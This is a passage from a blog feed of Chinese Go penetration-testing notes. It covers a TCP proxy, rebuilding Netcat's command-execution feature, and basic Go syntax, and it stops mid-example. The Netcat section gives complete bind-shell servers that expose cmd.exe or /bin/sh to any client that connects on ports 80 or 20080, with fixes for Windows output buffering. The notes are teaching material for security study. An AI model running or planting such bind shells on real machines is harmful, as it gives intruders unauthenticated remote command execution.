class="keyword">if</span> _,err := io.Copy(dst,src);err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"><span class="comment">//将目标的输出复制回源</span></span><br><span class="line"><span class="keyword">if</span> _,err := io.Copy(src,dst); err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//在本地的80端口上监听</span></span><br><span class="line">listener,err := net.Listen(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;:80&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to bind to port&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">conn ,err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to accept connection&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> handle(conn)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>现在我们把需要转发的网站标记为A，执行脚本的网站标记为B，以便理解下面的思路</p><p>其中，我们调用了两次Copy函数，第一次是确保A网站能和B服务器进行连接，第二次是确保回显的数据被写回到连接客户端的连接中。</p><p>这样，在代理的端口，就能持续接收到他发送的数据</p><h4 id="5-复现Netcat命令"><a href="#5-复现Netcat命令" class="headerlink" title="5. 复现Netcat命令"></a>5. 复现Netcat命令</h4><p>这里用到了Go的包<code>os/exec</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd := exec.Command(<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>)</span><br></pre></td></tr></table></figure><p>这将创建Cmd的实例，但尚未执行该命令，可以使用<code>stdin</code>和<code>stdout</code>，或者<code>Copy</code>将Reader或者<code>Writer</code>赋值给<code>Cmd</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd.Stdin= conn</span><br><span class="line">cmd.stdout = conn</span><br></pre></td></tr></table></figure><p>处理完数据流以后，就可以使用<code>cmd.Run()</code>运行命令</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> err := cmd.Run();err != <span class="literal">nil</span>&#123;</span><br><span class="line">    <span class="comment">//处理错误</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上操作很适合在linux下运行，但是在<code>Windows</code>系统上运行程序时，使用<code>cmd.exe</code>而不适用<code>/bin/bash</code>，你就会发现，由于某些Windows特定的匿名管道处理，连接的客户端永远收不到命令输出。</p><p>要解决上面的问题，有两种方案</p><p>首先，可以通过代码显示强制刷新标准输出以事应此席位的差别，不再直接将Conn赋给 cmd.Stdout，而是实现一个包装<code>bufio.Writer</code>(缓冲区写入器)的自定义<code>Writer</code>，并且显示调用<code>Flush</code>方法以强制刷新缓冲区</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bufio&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//Flusher包装 bufio.Writer,显示刷新所有写入</span></span><br><span class="line"><span class="keyword">type</span> Flusher <span class="keyword">struct</span> &#123;</span><br><span class="line">w * bufio.Writer</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//NewFlusher 从 io.Writer 创建一个新的 Flusher</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewFlusher</span><span class="params">(w io.Writer)</span></span> * Flusher&#123;</span><br><span class="line"><span class="keyword">return</span> &amp;Flusher&#123;</span><br><span class="line">w : bufio.NewWriter(w),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//写入数据并且显示刷新缓冲区</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(foo *Flusher)</span></span> Write(b []<span class="type">byte</span>)(<span class="type">int</span>,<span class="type">error</span>) &#123;</span><br><span class="line">count,err := foo.w.Write(b)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := foo.w.Flush();err != <span class="literal">nil</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>,err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> count,err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handle1</span><span class="params">(conn net.Conn)</span></span>  &#123;</span><br><span class="line"><span class="comment">//显示调用 /bin/sh 并且使用 -i进入交互模式</span></span><br><span class="line"><span class="comment">//这样我们就可以用它作为标准输入和输出</span></span><br><span class="line"><span class="comment">//对于Linux 使用 exec.Command(&quot;/bin/sh&quot;,&quot;-i&quot;)</span></span><br><span class="line">cmd := exec.Command(<span class="string">&quot;cmd.exe&quot;</span>)</span><br><span class="line"><span class="comment">//将标准输入设置为我们的连接</span></span><br><span class="line">cmd.Stdin = conn</span><br><span class="line"><span class="comment">//从连接创建一个Flusher用于标准输出</span></span><br><span class="line"><span class="comment">//这样可以确保标准输出被充分刷新并且通过 net.Conn进行发送</span></span><br><span class="line">cmd.Stdout = NewFlusher(conn)</span><br><span class="line"><span class="comment">//运行命令</span></span><br><span class="line"><span class="keyword">if</span> err := cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//在本地的80端口上监听</span></span><br><span class="line">listener,err := net.Listen(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;:80&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to bind to port&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">conn ,err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;unable to accept connection&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> handle1(conn)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>我这里踩了一个坑 <code>cmd /c</code>，在写脚本的时候，不可以加入 ‘&#x2F;c’参数，否则回一直无法建立连接</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220221183903.png"></p><p>当然，使用<code>telnet</code>也可以，效果是一样的</p><p>另一种方式是使用 <code>io.Pipe()</code>，该函数是<code>go</code>的同步内存管道，可用于连接<code>Reader</code>和<code>Writer</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Pipe</span><span class="params">()</span></span> (*PipeReader, *PipeWriter) &#123;</span><br><span class="line">p := &amp;pipe&#123;</span><br><span class="line">wrCh: <span class="built_in">make</span>(<span class="keyword">chan</span> []<span class="type">byte</span>),</span><br><span class="line">rdCh: <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>),</span><br><span class="line">done: <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;PipeReader&#123;p&#125;, &amp;PipeWriter&#123;p&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据其定义，我们可以对上面的代码进行一个优化</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handle2</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// cmd := exec.Command(&quot;/bin/sh&quot;,&quot;-i&quot;)</span></span><br><span class="line">cmd := exec.Command(<span class="string">&quot;cmd.exe&quot;</span>)</span><br><span class="line">rp, wp := io.Pipe()</span><br><span class="line"><span class="comment">//将标准输入设为我们的连接</span></span><br><span class="line">cmd.Stdin = conn</span><br><span class="line">cmd.Stdout = wp</span><br><span class="line"><span class="keyword">go</span> io.Copy(conn, rp)</span><br><span class="line">cmd.Run()</span><br><span class="line">conn.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">listener, err := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:20080&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">conn, err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> handle2(conn)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调用<code>io.Pipe</code>的时候，对创建一个同步连接的一个<code>reader</code>和一个<code>writer</code>，任何被写入<code>writer</code>的数据(wp)，都会被<code>reader</code>(rp)读取，因此，我们需要将<code>writer</code>分配给<code>cmd.Stdout</code>，然后使用<code>io.Copy(conn,rp)</code> 将<code>PipeReader</code>链接到<code>TCP</code>连接。之后使用<code>gprountine</code>防止阻塞。命令的标准输入发送到<code>writer</code>，然后通过管道传送到<code>reader</code>，并通过<code>TCP</code>连接输出。</p>]]></content>
    
    
    <summary type="html">对Go渗透测试中Tcp和扫描器的学习</summary>
    
    
    
    <category term="Go渗透测试" scheme="https://h0ld1rs.github.io/categories/Go%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Golang,渗透测试" scheme="https://h0ld1rs.github.io/tags/Golang-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Go渗透测试笔记(一)</title>
    <link href="https://h0ld1rs.github.io/posts/61606.html"/>
    <id>https://h0ld1rs.github.io/posts/61606.html</id>
    <published>2022-02-14T13:34:41.000Z</published>
    <updated>2022-03-01T13:48:19.077Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GO渗透测试笔记-一）"><a href="#GO渗透测试笔记-一）" class="headerlink" title="GO渗透测试笔记(一）"></a>GO渗透测试笔记(一）</h1><h1 id="0X01-基本使用"><a href="#0X01-基本使用" class="headerlink" title="0X01 基本使用"></a>0X01 基本使用</h1><ol><li><p>当在某些极端的情况可以使用<code>go build -ldflags &quot;-w -s&quot;</code>进行编译，从二进制文件中剥离调试信息和字符表，从而减少文件的大小，适合在某些极端的情况进行嵌入（大约可以减少 30%）</p></li><li><p>创建使用不同架构上使用的二进制文件—<strong>交叉编译</strong></p></li><li><p>go doc 函数 –&gt;可以查询有关的包，函数的使用方法文档</p></li><li><p>go get —-&gt;  很多情况下，go程序需要要引入第三方包，可以使用此命令进行导入</p><blockquote><p>即使你使用了 import 导入了相应的包，如<code>stacktian/ldapauth</code>，也无法访问。必须先下载实际的包，</p><p>go get “github.com&#x2F;stacktian&#x2F;ldapauth” 下载实际的包，并且放在 $GOPATH&#x2F;SRC目录下</p></blockquote></li><li><p>go 引入了两个工具<code>dep和mod</code>来锁定清理依赖项，有助于避免正在进行的依赖项不一致</p><blockquote><p>go mod tidy</p><p>go mod download 是使用mod时经常使用的两个命令</p></blockquote></li><li><p>go fmt –&gt;可以自动格式化源代码，强制使用正确的换行符，缩进和大括号来设置代码样式。—&gt;大部分IDE包含的钩子会在保存文件时自动执行 go fmt，因此无需显式执行该命令</p></li><li><p>golint 和 go vet命令</p><blockquote><p>go fmt 会更改代码的语法样式，但是golint会报告样式错误，例如缺少注释，不遵循约定的变量命名等，无用的类型等等。</p><p>golint时独立工具，需要 go get -u “golang.org&#x2F;x&#x2F;lint&#x2F;golint”进行下载</p><p>go vet 也会尝试确定编译器中可能忽略的问题，其中一些可能是合法的错误</p></blockquote></li><li><p>GO Playground -&gt; 托管的执行环境，为开发人员提供了稳定的web前端，以快速，测试，执行和共享Go代码段，但是会限制使用系统命令和第三方交互</p></li></ol><h2 id="go-的基本语法"><a href="#go-的基本语法" class="headerlink" title="go 的基本语法"></a>go 的基本语法</h2><h4 id="1-结构体和接口"><a href="#1-结构体和接口" class="headerlink" title="1. 结构体和接口"></a>1. 结构体和接口</h4><p>定义如下方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="type">string</span></span><br><span class="line">Age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p * Person)</span></span> sayHello()  &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;hello&quot;</span>,p.Name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> guy = <span class="built_in">new</span>(Person)</span><br><span class="line">guy.Name = <span class="string">&quot;Dave&quot;</span></span><br><span class="line">guy.Age = <span class="number">12</span></span><br><span class="line">guy.sayHello()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此语言定义Person变量的方法，sayHello()，其他语言将p视为<code>self</code>与<code>this</code>的引用。</p><blockquote><p>于此同时，结构体缺少作用域修饰符(如 public ，private 等等)，</p><p>Go语言中通过大写字母确定作用域，以大写字母开头的类型和字段可以在包外部进行导出并访问，以小写字母开头的类型和字段是私有的，只能在包内部访问</p></blockquote><p>引入接口时</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="type">string</span></span><br><span class="line">Age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p * Person)</span></span> sayHello()  &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;hello&quot;</span>,p.Name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span>  Friend <span class="keyword">interface</span> &#123;</span><br><span class="line">sayHello()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Greet</span><span class="params">(f Friend)</span></span>  &#123;</span><br><span class="line">f.sayHello()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> guy = <span class="built_in">new</span>(Person)</span><br><span class="line">guy.Name = <span class="string">&quot;Dave&quot;</span></span><br><span class="line">Greet(guy)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义了名为<code>friend</code>的接口，该接口需要实现一个方法<code>sayHello</code>，这意味着任何实现了方法<code>sayHello()</code>类型的都是<code>Friend</code>，</p><blockquote><p>注意：Friend实际上并未实现这个函数，他只是说，如果你是Friend，则能够使用<code>sayHello</code></p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="type">string</span></span><br><span class="line">Age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> Dog <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="type">string</span></span><br><span class="line">Age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Dog)</span></span> sayHello() &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;woof,woof&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p * Person)</span></span> sayHello()  &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;hello&quot;</span>,p.Name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span>  Friend <span class="keyword">interface</span> &#123;</span><br><span class="line">sayHello()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Greet</span><span class="params">(f Friend)</span></span>  &#123;</span><br><span class="line">f.sayHello()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> guy = <span class="built_in">new</span>(Person)</span><br><span class="line">guy.Name = <span class="string">&quot;Dave&quot;</span></span><br><span class="line">Greet(guy)</span><br><span class="line"><span class="keyword">var</span> dog = <span class="built_in">new</span> (Dog)</span><br><span class="line">Greet(dog)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-控制结构"><a href="#2-控制结构" class="headerlink" title="2 控制结构"></a>2 控制结构</h4><p>Go 包含的控制结构比其他现代语言要少的多。Go主要的语法条件是<code>if/else</code></p><p>用户输入的时候用<code>fmt.Scanln()</code>比较合适</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> x <span class="type">int</span></span><br><span class="line">fmt.Println(<span class="string">&quot;请输入x&quot;</span>)</span><br><span class="line">fmt.Scanln(&amp;x)</span><br><span class="line"><span class="keyword">if</span> x==<span class="number">1</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;x is equals 1&quot;</span>)</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;x is not equals 1&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当使用switch结构的时候，Go语言必须使用花括号,与其他现代编程语言不同的是，go不需要包含<code>break</code>语句。在其他语言中当 case不包含<code>break</code>的时候，将持续执行，在<code>go</code>中只会执行一种语句</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"> <span class="keyword">var</span> x = <span class="string">&quot;foo&quot;</span></span><br><span class="line"><span class="keyword">switch</span> x &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;foo&quot;</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;fonud foo&quot;</span>);</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;bar&quot;</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;fonud bar&quot;</span>);</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;default&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Go有一个 <code>type switch</code>的特殊变体，通过<code>switch</code>语句进行类型断言，对判断类型接口很有用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">foo</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span>  &#123;</span><br><span class="line"><span class="keyword">switch</span> i.(<span class="keyword">type</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="type">int</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;int&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="type">string</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;string&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;unknown error&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">foo(<span class="type">int</span>(<span class="number">64</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>本示例中使用特殊语法(i.type)检查 i 变量的类型，然后进行匹配</p></blockquote><p>最后一个流程控制是<code>for</code>循环，for循环是 Go用于执行重复代码的结构，Go没有诸如<code>do</code>或者<code>while</code>之类的约定</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++ &#123;</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以下是 for循环的一个轻量级变体，用于遍历集合或者切片&#x2F;映射</p><blockquote><p>和python 一样，idx用于索引</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span 